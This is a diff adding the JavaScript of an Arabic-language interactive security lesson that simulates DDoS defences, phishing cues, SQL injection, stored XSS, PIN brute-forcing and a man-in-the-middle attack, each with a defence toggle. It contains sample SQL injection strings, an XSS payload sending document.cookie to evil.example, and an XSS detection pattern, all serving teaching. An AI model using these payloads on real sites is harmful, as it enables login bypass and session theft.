+    {id:'js',code:'CHALLENGE',name:'تحدي جافاسكربت',desc:'إثبات «متصفح حي» قبل الخدمة: البوتات البسيطة تسقط عند الحافة، والمتصفحات الرأسية تجتاز.',on:'~95% من البوتات تُوقف',off:'كل طلب HTTP يستهلك معالجة كاملة',lgOn:['CHALLENGE','إثبات متصفح مطلوب — البوتات البسيطة تسقط'],lgOff:['CHALLENGE','أُطفئ — البوتات تمرّ الطلبات']},
+    {id:'cdn',code:'CDN / SCRUB',name:'شبكة تصفية ضخمة',desc:'الاختباء خلف سعة 10 Gbps تستبعد 65% من الحجمي قبل أن يصل لأنبوبك — الحل العملي للطوفان المُضخَّم، ضمن سعتها.',on:'السعة 1G→10G · استبعاد 65% من الحجمي',off:'أنبوب 1 Gbps مكشوف مباشرة',lgOn:['CDN','حافة 10 Gbps تستبعد 65% من الحجمي'],lgOff:['CDN','أُطفئ — الخادم مكشوف على أنبوبه']},
+  ];
+  const stack=$('#dDefStack'),drows={};
+  DEFS.forEach((d,i)=>{
+    const row=document.createElement('div');
+    row.className='drow';row.tabIndex=0;row.setAttribute('role','switch');row.setAttribute('aria-checked','false');
+    row.innerHTML=`<div class="d-num" dir="ltr">D${i+1}</div><div><div class="d-name">${d.name}<span class="d-code" dir="ltr">${d.code}</span></div><div class="d-desc">${d.desc}</div><div class="d-eff" style="font-size:10.5px;margin-top:5px;color:#B3767A"></div></div><div class="sw"><i></i></div>`;
+    stack.appendChild(row);drows[d.id]=row;
+    const go=()=>setDef(d.id,!S.def[d.id]);
+    row.addEventListener('click',go);
+    row.addEventListener('keydown',e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();go();}});
+  });
+  function setDef(id,on){
+    S.def[id]=on;const d=DEFS.find(x=>x.id===id),row=drows[id];
+    row.classList.toggle('on',on);row.setAttribute('aria-checked',on);
+    const eff=row.querySelector('.d-eff');
+    eff.textContent=(on?'▸ ':'')+(on?d.on:d.off);eff.style.color=on?'var(--acc)':'#B3767A';
+    addLog([[on?d.lgOn[0]:d.lgOff[0],on?'c-acc':'c-dim'],[on?d.lgOn[1]:d.lgOff[1],on?'c-acc':'c-dim']]);
+    if(id==='cdn')$('#dShield').style.display=on?'':'none';
+    updatePower();updateHUD();
+  }
+  const MTX={
+    rl:{syn:['part','يقصّ الجهاز الواحد فوراً؛ كل بوت منفرد «تحت الحد»'],http:['part','نفس المبدأ'],udp:['part','نفس المبدأ'],amp:['none','الحجم يأتي من مُنعكسات بريئة — لا «مصدر» يُقصّ']},
+    ck:{syn:['full','لا حجز ذاكرة إطلاقاً — الهجوم يفقد سلاحه'],http:['none','لا علاقة له بالطلبات المكتملة'],udp:['none','ليس اتصالاً أصلاً'],amp:['none','الردود تصل جاهزة من المُنعكسات']},
+    js:{syn:['none','المصافحة تسبق أي تحدٍّ'],http:['part','يوقف البوتات البسيطة؛ الرأسية تجتاز'],udp:['none','لا طبقة تطبيق أصلاً'],amp:['none','ردود DNS مشروعة الشكل']},
+    cdn:{syn:['full','الحافة تُنهي المصافحة بالنيابة'],http:['part','تخفيف جزئي — الباقي للتحديات'],udp:['full','ضمن سعتها (10 Gbps)'],amp:['full','ضمن سعتها — وهناك ما يفوقها']},
+  };
+  const mtx=$('#dMtx');let mh='<span class="mh"></span>';
+  ['SYN','HTTP','UDP','AMP'].forEach(v=>mh+=`<span class="mh" dir="ltr">${v}</span>`);
+  mtx.innerHTML=mh;
+  DEFS.forEach(d=>{
+    let r=`<span class="mr">${d.name}</span>`;
+    ['syn','http','udp','amp'].forEach(v=>{const[k,tip]=MTX[d.id][v];r+=`<span class="badge b-${k}" title="${tip}"></span>`;});
+    mtx.innerHTML+=r;
+  });
+  /* سجل دوري */
+  let lc=0;
+  setInterval(()=>{
+    lc++;
+    if(!S.attacking){if(S.conn>40&&lc%3===0)addLog([['DRAIN','c-dim'],['فتحات قديمة تنتهي مهلتها — الجدول يفرغ تدريجياً']]);return;}
+    const v=S.vector,d=S.def;
+    if(v==='syn')addLog([['SYN','c-red'],['من '+ip()+' — لا ACK قادم · الفتحة تنتظر 18 ثانية','c-red']]);
+    else if(v==='http')addLog([['GET /','c-red'],['من '+ip()+' — كل طلب يُعالَج على المعالج بالكامل','c-red']]);
+    else if(v==='udp')addLog([['UDP','c-red'],['من '+ip()+' — حشو خام يلتهم النطاق','c-red']]);
+    else addLog([['DNS Q','c-red'],['استعلام مزيَّف — «المصدر» = عنوان الضحية · الرد ×35','c-red']]);
+    if(lc%2===0){
+      if(d.rl&&S.mode==='dos')addLog([['RATE-LIMIT','c-acc'],['المصدر الوحيد تجاوز الحد — قُصّ عند الحافة','c-acc']]);
+      else if(d.rl&&S.mode==='ddos')addLog([['RATE-LIMIT','c-dim'],['بوت جديد '+ip()+' — 3 Mbps فقط: «تحت الحد»، لا يُقصّ','c-dim']]);
+      if(d.ck&&v==='syn')addLog([['SYN COOKIE','c-acc'],['الردّ بلا حجز ذاكرة — الجدول يُفرَّغ بجدولة عدوانية','c-acc']]);
+      if(d.js&&v==='http')addLog([['CHALLENGE','c-acc'],['بوت فشل إثبات المتصفح — أُوقف عند الحافة','c-acc']]);
+      if(d.cdn&&(v==='udp'||v==='amp'))addLog([['SCRUB','c-acc'],['استُبعد 65% من الحجمي عند حافة الـ CDN','c-acc']]);
+    }
+  },1500);
+  updateHUD();updatePower();
+  addLog([['SYS','c-dim'],['ساحة جاهزة — خادم وهمي على أنبوب 1 Gbps يخدم 4 مستخدمين']]);
+})();
+
+/* ============ 02 · التصيّد ============ */
+(function(){
+  const P=new Set();
+  const list=$('#pList'),count=$('#pCount');
+  function addFound(k,t,ex,dim){
+    const li=document.createElement('li');if(dim)li.className='dim';
+    li.innerHTML=`<b>${t}</b><span>${ex}</span>`;list.appendChild(li);
+    count.innerHTML=P.size+' <small>/ 6 مؤشرات</small>';
+    if(P.size===6){$('#pVer').classList.add('show');toast('ستة من ستة — رسالة المحتال عُريت بالكامل قبل أول نقرة. هذه بالضبط مهارة «قراءة» البريد التي لا يشتريها أحد.');}
+  }
+  $$('.p-flag').forEach(el=>el.addEventListener('click',()=>{
+    const k=el.dataset.k;if(P.has(k))return;
+    P.add(k);el.classList.add('hit');
+    const m=document.createElement('span');m.className='fmark';el.appendChild(m);
+    if(k==='link')$('#pLinkHint').classList.add('show');
+    addFound(k,el.dataset.t,el.dataset.ex);
+  }));
+  $('#pReveal').addEventListener('click',()=>{
+    $$('.p-flag').forEach(el=>{
+      const k=el.dataset.k;if(P.has(k))return;
+      P.add(k);el.classList.add('hit','dim');
+      if(k==='link')$('#pLinkHint').classList.add('show');
+      addFound(k,el.dataset.t,el.dataset.ex,true);
+    });
+  });
+})();
+
+/* ============ 03 · الحقن ============ */
+(function(){
+  const SQ={def:false};
+  const USERS=[{u:'admin',p:'qwerty123'},{u:'sara',p:'S@ra2024'},{u:'omar',p:'omar12345'}];
+  const ui=$('#sqU'),pi=$('#sqP'),q=$('#sqQ'),params=$('#sqParams'),res=$('#sqRes');
+  const isByp=t=>/('\s*--)|(admin'\s*--)|('\s*or\s*')|(or\s+'?1'?\s*=\s*'?1)/i.test(t);
+  const isOr=t=>/\bor\b|'1'='1/i.test(t);
+  function renderQ(){
+    if(SQ.def){
+      q.innerHTML=`SELECT id, user, balance<br>&nbsp;&nbsp;FROM users<br>&nbsp;WHERE user = <span class="lit">?</span> AND pass = <span class="lit">?</span>`;
+      params.className='show';
+      params.innerHTML=`params → [<b>${esc(ui.value)||'""'}</b>, <b>${esc(pi.value)||'""'}</b>] &nbsp;<span style="color:var(--dim)">— تُحمَّل كبيانات خام، لا تُفسَّر أبداً</span>`;
+    }else{
+      const bad=/'/.test(ui.value+pi.value);
+      const cls=bad?'inj':'';
+      q.innerHTML=`SELECT id, user, balance<br>&nbsp;&nbsp;FROM users<br>&nbsp;WHERE user='<span class="${cls}">${esc(ui.value)}</span>' AND pass='<span class="${cls}">${esc(pi.value)}</span>'`;
+      params.className='';
+    }
+  }
+  ui.addEventListener('input',renderQ);pi.addEventListener('input',renderQ);
+  function showRes(kind,title,body){
+    res.className='show '+kind;
+    res.innerHTML=`<b>${title}</b><span>${body}</span>`;
+  }
+  function clearRows(){$$('#sqTable tr').forEach(r=>r.classList.remove('hit'));}
+  $('#sqGo').addEventListener('click',()=>{
+    const u=ui.value,p=pi.value,t=u+' '+p;
+    clearRows();
+    if(SQ.def){
+      const m=USERS.find(x=>x.u===u&&x.p===p);
+      if(m){$( `#sqTable tr[data-u="${m.u}"]`).classList.add('hit');showRes('ok','دخول مشروع — '+m.u,'المطابقة تمت على قيمتين حرفيتين. جرّبتَ الحقن أعلاه؟ صار مجرد نص يُقارَن حرفاً بحرف — ولا يشبه شيئاً.');}
+      else showRes('bad','رفض الدخول','المُعاملات حُمِّلت كنص خام: محاولة الحقن صارت سلسلة بلا معنى تُقارَن ولا تُنفَّذ. هذا هو العلاج البنيوي لا الترقيع.');
+    }else if(isByp(t)){
+      if(isOr(t)){$$('#sqTable tr').forEach(r=>r.classList.add('hit'));showRes('bad','دخول بلا كلمة مرور — كل الصفوف!','شرط OR جعل «أين user=نص AND pass=نص» صحيحاً لكل صف، فأعاد الاستعلام الجدول كاملاً — وعدّ الأول admin.');}
+      else{$('#sqTable tr[data-u="admin"]').classList.add('hit');showRes('bad','دخول بلا كلمة مرور — admin','علامة الاقتباس أغلقت النص، و «--» علّقت شرط كلمة المرور كله: الاستعلام صار «أعطني admin وتجاهل الباقي».');}
+    }else if(/'/.test(t)){
+      showRes('bad','خطأ استعلام','اقتباس وحده كسر الصياغة — الخادم رفض استعلاماً غير صالح. المحتال الحقيقي يضيف بعدها ما يُكمِل الخدعة.');
+    }else{
+      const m=USERS.find(x=>x.u===u&&x.p===p);
+      if(m){$('#sqTable tr[data-u="'+m.u+'"]').classList.add('hit');showRes('ok','دخول مشروع — '+m.u,'بيانات صحيحة عبر المسار السليم. جرّب الآن أحد حقني الأزرار وشاهد الفرق.');}
+      else showRes('bad','رفض الدخول','بيانات غير صحيحة — جرّب زرَّي الحقن الجاهزين تحت، أو اكتب: admin\' --');
+    }
+  });
+  $('#sqPre1').addEventListener('click',()=>{ui.value="admin' --";pi.value='anything';renderQ();showRes('bad','مستعد للتنفيذ — اضغط «دخول»','راقب سطر الاستعلام: علامة الاقتباس أغلقت النص، و «--» علّقت ما بعده — شرط كلمة المرور لم يعد موجوداً أصلاً.');});
+  $('#sqPre2').addEventListener('click',()=>{ui.value="' OR '1'='1' --";pi.value='';renderQ();showRes('bad','مستعد للتنفيذ — اضغط «دخول»','‏OR مع مقارنة صحيحة دائماً (1=1) تجعل الشرط صادقاً لكل صف في الجدول.');});
+  $('#sqClr').addEventListener('click',()=>{ui.value='';pi.value='';renderQ();res.className='';clearRows();});
+  $('#sqDefSw').addEventListener('click',()=>{
+    SQ.def=!SQ.def;
+    $('#sqDefSw').classList.toggle('on',SQ.def);
+    renderQ();clearRows();res.className='';
+  });
+  renderQ();
+})();
+
+/* ============ 04 · الشيفرة المدسوسة ============ */
+(function(){
+  const X={def:false,loot:0};
+  const PAYLOAD='<sc'+'ript>location="//evil.example/?c="+document.cookie</scr'+'ipt>';
+  const isMal=v=>/<\s*\/?\s*(script|img|svg|iframe)|on\w+\s*=|javascript:/i.test(v);
+  const list=$('#xList');
+  const seed=[{who:'ليلى',txt:'وصلني الطلب، شكراً على السرعة!'},{who:'خالد',txt:'التوصيل كان أسرع من المتوقع 👍'.replace(' 👍','')}];
+  function render(){
+    list.innerHTML='';
+    seed.forEach(c=>{
+      const li=document.createElement('li');
+      li.innerHTML=`<div class="who">${c.who}</div><div class="txt">${esc(c.txt)}</div>`;
+      list.appendChild(li);
+    });
+  }
+  render();
+  let alertT;
+  function fireAlert(){
+    const a=$('#xAlert');a.classList.add('show');
+    clearTimeout(alertT);alertT=setTimeout(()=>a.classList.remove('show'),4200);
+  }
+  function updateLoot(){
+    $('#xCount').textContent=X.loot;
+    const box=$('#xLoot');
+    if(X.loot===0){box.innerHTML='<span class="chipx c-dim">لا شيء بعد — انشر حقنة بلا دفاع</span>';return;}
+    box.innerHTML='';
+    for(let i=0;i<Math.min(X.loot,6);i++)
+      box.innerHTML+=`<span class="chipx c-red" dir="ltr">SESSION=${Math.random().toString(16).slice(2,10)}…</span>`;
+    if(X.loot>6)box.innerHTML+=`<span class="chipx c-dim">+${X.loot-6} أخرى</span>`;
+  }
+  function submit(){
+    const v=$('#xIn').value.trim();if(!v)return;
+    const mal=isMal(v);
+    const li=document.createElement('li');
+    if(mal&&!X.def){
+      X.loot++;fireAlert();updateLoot();
+      li.className='exec';
+      li.innerHTML=`<div class="who">زائر جديد</div><div class="txt" style="color:#E8767A;font-family:var(--mono);font-size:11.5px;direction:ltr">[ شيفرة نُفِّذت في متصفح كل زائر ]</div><div class="txt raw" style="color:var(--dim)">${esc(v)}</div><div class="tagline">نُفِّذت كأمر HTML — السطر أعلاه لم يُعرض كنص قط</div>`;
+    }else if(mal&&X.def){
+      li.className='safe';
+      li.innerHTML=`<div class="who">زائر جديد</div><div class="txt raw">${esc(v)}</div><div class="tagline">نص خام معروض ككلام — الرموز تحوّلت لكيانات فلا تنفيذ. نفس الحقنة، بلا ناب.</div>`;
+    }else{
+      li.innerHTML=`<div class="who">زائر جديد</div><div class="txt">${esc(v)}</div>`;
+    }
+    list.prepend(li);
+    while(list.children.length>8)list.lastChild.remove();
+    $('#xIn').value='';
+  }
+  $('#xGo').addEventListener('click',submit);
+  $('#xIn').addEventListener('keydown',e=>{if(e.key==='Enter')submit();});
+  $('#xPre').addEventListener('click',()=>{$('#xIn').value=PAYLOAD;toast('الحقنة جاهزة في الحقل — اضغط «نشر» وشاهد فرق المفتاح الواحد أعلى اللوحة.');});
+  $('#xDefSw').addEventListener('click',()=>{
+    X.def=!X.def;
+    $('#xDefSw').classList.toggle('on',X.def);
+  });
+})();
+
+/* ============ 05 · التخمين ============ */
+(function(){
+  /* الحاسبة */
+  const pw=$('#bPw');
+  const fmtT=sec=>{
+    if(sec<1)return'لحظة';
+    if(sec<60)return Math.ceil(sec)+' ثانية';
+    if(sec<3600)return (sec/60).toFixed(1)+' دقيقة';
+    if(sec<86400)return (sec/3600).toFixed(1)+' ساعة';
+    if(sec<3.156e7)return (sec/86400).toFixed(1)+' يوم';
+    const yrs=sec/3.156e7;
+    if(yrs<1.38e10)return fmtN(yrs)+' سنة';
+    return '×'+(yrs/1.38e10).toExponential(1)+' عمر الكون';
+  };
+  function calc(){
+    const v=pw.value,len=v.length;
+    if(!len){$('#bBits').innerHTML='— <small>bits من العشوائية</small>';$('#bSub').textContent='الطول وتنوّع الحروف يحددان حجم فضاء البحث';['1','2','3'].forEach(i=>{$('#bV'+i).textContent='—';$('#bB'+i).style.width='0';});return;}
+    const cs=(/[a-z]/.test(v)?26:0)+(/[A-Z]/.test(v)?26:0)+(/\d/.test(v)?10:0)+(/[^a-zA-Z0-9]/.test(v)?33:0);
+    const bits=len*Math.log2(cs||1);
+    const attempts=Math.pow(2,bits-1);
+    $('#bBits').innerHTML=bits.toFixed(0)+' <small>bits من العشوائية</small>';
+    $('#bSub').textContent=`الطول ${len} · ${cs} حرفاً محتملاً في كل خانة · فضاء ${cs>=2?Math.pow(cs,len).toExponential(1):'—'} احتمال`;
+    [[1,1e2],[2,1e11],[3,1e14]].forEach(([i,spd])=>{
+      const t=attempts/spd;
+      $('#bV'+i).textContent=fmtT(t);
+      $('#bB'+i).style.width=Math.min(100,Math.log10(Math.max(1,t))/17.2*100)+'%';
+    });
+  }
+  pw.addEventListener('input',calc);
+  /* مختبر PIN */
+  const B={pin:'',guess:-1,tries:0,locked:false,lockLeft:0,running:false,def:true,found:false,elap:0};
+  const newPin=()=>String(Math.floor(Math.random()*10000)).padStart(4,'0');
+  B.pin=newPin();
+  const g4=n=>String(n).padStart(4,'0');
+  function hud(){
+    $('#bTries').textContent=fmtN(B.tries);
+    $('#bGuess').textContent=B.found?B.pin:(B.locked?'—':g4(Math.max(0,B.guess)));
+    $('#bElap').textContent=Math.round(B.elap)+'s';
+    $('#bCov').style.width=Math.min(100,(B.guess+1)/100)+'%';
+    const lock=$('#bLock');
+    if(B.locked){lock.textContent='مقفل '+B.lockLeft.toFixed(1)+'s';lock.style.color='var(--acc)';}
+    else if(B.found){lock.textContent='سُرق!';lock.style.color='var(--red)';}
+    else{lock.textContent=B.def?'نشط':'معطّل';lock.style.color='var(--dim)';}
+    if(B.found)return;
+    const remain=10000-Math.max(0,B.guess);
+    const rate=B.def?5/(5+5*.08):3/.08;
+    const eta=remain/rate;
+    $('#bEta').innerHTML='شريط التغطية: '+((B.guess+1)/100).toFixed(1)+'% من فضاء الـ10,000 احتمال · الوقت المتوقع للوصول المتوسط: '+
+      (B.def?'<b style="color:var(--acc)">'+(eta/3600).toFixed(1)+' ساعة</b> — القفل جعلها ساعات':'<b style="color:#E8767A">'+(eta/60).toFixed(0)+' دقيقة</b> — بلا قفل: دقائق فقط')+
+      ' <span style="color:var(--dim)">(بحسب وتيرة العرض المسرَّعة)</span>';
+  }
+  function finish(){
+    B.found=true;B.running=false;
+    const btn=$('#bStart');btn.classList.remove('on');btn.textContent='بدء الهجوم';
+    const f=$('#bFound');f.classList.add('show');
+    f.innerHTML=`<b>سُرق الرقم ${B.pin} بعد ${fmtN(B.tries)} محاولة — زمن العرض ${Math.round(B.elap)} ثانية</b>
+    <span>${B.def
+      ?'كان القفل يعمل: خمس محاولات فقط كل دورة قفل، فتحوّلت مهمة دقيقة إلى ساعات. بهذا المفتاح السخي وحده نجا حساب صاحب الرقم — جرّب إطفاء القفل وأعد الهجوم للمقارنة.'
+      :'بلا قفل: 4 خانات = 10,000 احتمال فقط، ودقيقة واحدة تكفي. الآن فعّل القفل وأعد الهجوم — نفس الرقم، عالم آخر.'}</span>`;
+    hud();
+  }
+  setInterval(()=>{
+    if(!B.running||B.found){if(B.locked&&!B.found){B.lockLeft-=.08;if(B.lockLeft<=0)B.locked=false;hud();}return;}
+    B.elap+=.08;
+    if(B.locked){B.lockLeft-=.08;if(B.lockLeft<=0)B.locked=false;hud();return;}
+    for(let i=0;i<3;i++){
+      B.guess++;B.tries++;
+      if(g4(B.guess)===B.pin){finish();return;}
+      if(B.def&&B.tries%5===0){B.locked=true;B.lockLeft=5;break;}
+    }
+    hud();
+  },80);
+  $('#bStart').addEventListener('click',()=>{
+    if(B.found)return toast('الهجوم انتهى — اضغط «رقم جديد وإعادة» لتجربة أخرى.');
+    B.running=!B.running;
+    const btn=$('#bStart');btn.classList.toggle('on',B.running);
+    btn.textContent=B.running?'إيقاف مؤقت':'استئناف الهجوم';
+  });
+  $('#bReset').addEventListener('click',()=>{
+    B.pin=newPin();B.guess=-1;B.tries=0;B.locked=false;B.lockLeft=0;B.running=false;B.found=false;B.elap=0;
+    const btn=$('#bStart');btn.classList.remove('on');btn.textContent='بدء الهجوم';
+    $('#bFound').classList.remove('show');hud();
+  });
+  $('#bDefSw').addEventListener('click',()=>{
+    B.def=!B.def;
+    $('#bDefSw').classList.toggle('on',B.def);
+  });
+  hud();
+})();
+
+/* ============ 06 · المنتصف ============ */
+(function(){
+  const M={tls:false,ignored:false,warned:false,busy:false,readableCap:0};
+  const svg=$('#mSvg'),pkts=$('#mPkts'),eye=$('#mEye');
+  function pulse(x,y,red,r){
+    const c=document.createElementNS(ns,'circle');
+    c.setAttribute('cx',x);c.setAttribute('cy',y);c.setAttribute('r',r||22);
+    c.setAttribute('class','pulse '+(red?'p-red':'p-grn'));
+    svg.appendChild(c);setTimeout(()=>c.remove(),750);
+  }
+  function addCap(chips){
+    const log=$('#mLog');
+    if(log.children.length===1&&!log.firstChild.dataset.real)log.innerHTML='';
+    const row=document.createElement('div');row.className='cap';row.dataset.real='1';
+    let h=`<span class="ct" dir="ltr">${nowT()}</span>`;
+    chips.forEach(([t,c])=>h+=`<span class="chipx ${c}" dir="auto">${t}</span>`);
+    row.innerHTML=h;log.prepend(row);
+    while(log.children.length>6)log.lastChild.remove();
+  }
+  function know(){
+    const k=$('#mKnow');
+    if(M.ignored){
+      k.innerHTML='<span class="k">ما يعرفه المهاجم الآن:</span><span class="chipx c-red">المبلغ والبنك</span><span class="chipx c-red">كوكي الجلسة</span><span class="chipx c-red">كل ما يُرسل لاحقاً — الشهادة المزوّورة بينكم</span>';
+    }else if(M.tls){
+      k.innerHTML='<span class="k">ما يعرفه المهاجم الآن:</span><span class="chipx c-acc">TLS · ciphertext فقط</span><span class="chipx c-dim">حجم وتوقيت — لا محتوى</span>';
+    }else if(M.readableCap){
+      k.innerHTML='<span class="k">ما يعرفه المهاجم الآن:</span><span class="chipx c-red">المبلغ والبنك</span><span class="chipx c-red">كوكي الجلسة</span>';
+    }else{
+      k.innerHTML='<span class="k">ما يعرفه المهاجم الآن:</span><span class="chipx c-dim">لا شيء</span>';
+    }
+  }
+  function state(){
+    const el=$('#mState');
+    if(M.ignored)el.innerHTML='<span style="color:#E8767A">TLS + شهادة مزوّورة مقبولة — التشفير شكلي من الآن: المهاجم يفكّ ويُعيد التشفير بينك وبين كل جهة.</span>';
+    else if(M.tls)el.innerHTML='TLS جاهز — عند أول إرسال سيحاول المهاجم شهادة مزوّرة، و<b style="color:var(--acc)">قرارك</b> يحدد كل ما بعده.';
+    else el.innerHTML='بلا TLS — كل ما ترسله نصٌّ صريح يمرّ أمام العين مباشرة.';
+  }
+  async function send(){
+    if(M.busy)return;
+    if(M.tls&&!M.warned){$('#mWarn').classList.add('show');return;}
+    M.busy=true;
+    const readable=!M.tls||M.ignored;
+    const g=document.createElementNS(ns,'g');
+    g.innerHTML=readable
+      ?'<rect x="-10" y="-7" width="20" height="14" rx="2" class="mk-plain"/><line x1="-6" y1="-2" x2="6" y2="-2" class="pl"/><line x1="-6" y1="2" x2="3" y2="2" class="pl"/>'
+      :'<rect x="-8" y="-8" width="16" height="16" rx="2" class="mk-enc"/><rect x="-4" y="-3" width="3" height="6" class="mk-bits"/><rect x="1" y="-5" width="2" height="4" class="mk-bits"/>';
+    pkts.appendChild(g);
+    await tween(g,872,110,512,110,900);
+    pulse(500,110,readable,20);
+    if(readable){
+      M.readableCap=true;
+      eye.classList.add('seeing');setTimeout(()=>eye.classList.remove('seeing'),700);
+      const chips=[['حوّل 500 → SA03•••812','c-red'],['SESSION=8f3a9c•••','c-red']];
+      if(M.ignored)chips.push(['عبر شهادة مزوّورة قُبلت','c-red']);
+      addCap(chips);
+    }else{
+      addCap([['TLS 1.3','c-acc'],['ciphertext · 9f3a…b2e1','c-dim'],['لا شيء مقروء','c-dim']]);
+    }
+    know();
+    await tween(g,512,110,148,110,900);g.remove();
+    const r=document.createElementNS(ns,'g');
+    r.innerHTML=readable?'<circle r="5" class="mk-plainC"/>':'<rect x="-6" y="-6" width="12" height="12" rx="2" class="mk-enc"/>';
+    pkts.appendChild(r);
+    await tween(r,148,110,512,110,800);
+    if(readable)pulse(500,110,true,16);
+    await tween(r,512,110,872,110,800);r.remove();
+    if(!readable)addCap([['ردّ البنك: مشفّر أيضاً','c-dim']]);
+    M.busy=false;
+  }
+  $('#mSend').addEventListener('click',send);
+  $('#mWarn .mw-safe').addEventListener('click',()=>{
+    $('#mWarn').classList.remove('show');
+    M.warned=true;M.ignored=false;state();know();
+    toast('قرار سليم: رفضتَ شهادة مجهولة. أعيد الاتصال الآن عبر القناة الموثوقة — والعين لا ترى إلا عشوائية.');
+    send();
+  });
+  $('#mWarn .mw-bad').addEventListener('click',()=>{
+    $('#mWarn').classList.remove('show');
+    M.warned=true;M.ignored=true;state();know();
+    addCap([['!!','c-red'],['قَبِل المستخدم شهادة مزوّورة — التشفير انتهى عملياً','c-red']]);
+    toast('من هذه اللحظة المهاجم يقرأ كل شيء ويستطيع تعديله: لم يُهزم التشفير تقنياً — تجاوزته بيدك. هذا أخطر درس في الوحدة كلها.','warn');
+    send();
+  });
+  $('#mTlsSw').addEventListener('click',()=>{
+    M.tls=!M.tls;
+    $('#mTlsSw').classList.toggle('on',M.tls);
+    $('#mTlsBadge').style.display=M.tls?'':'none';
+    M.warned=false;M.ignored=false;
+    $('#mWarn').classList.remove('show');
+    state();know();
+  });
+  $('#mReset').addEventListener('click',()=>{
+    M.warned=false;M.ignored=false;M.readableCap=false;M.busy=false;
+    $('#mWarn').classList.remove('show');
+    $('#mLog').innerHTML='<div class="cap"><span class="ct" dir="ltr">--:--:--</span><span class="chipx c-dim">لا التقاطات بعد — أرسل حوالة</span></div>';
+    state();know();
+    toast('جلسة جديدة — إن كان TLS مفعلاً سيحاول المهاجم شهادة مزوّرة من جديد عند أول إرسال.');
+  });
+  state();know();
+})();
+})();
+</script>
+</body>
+</html>
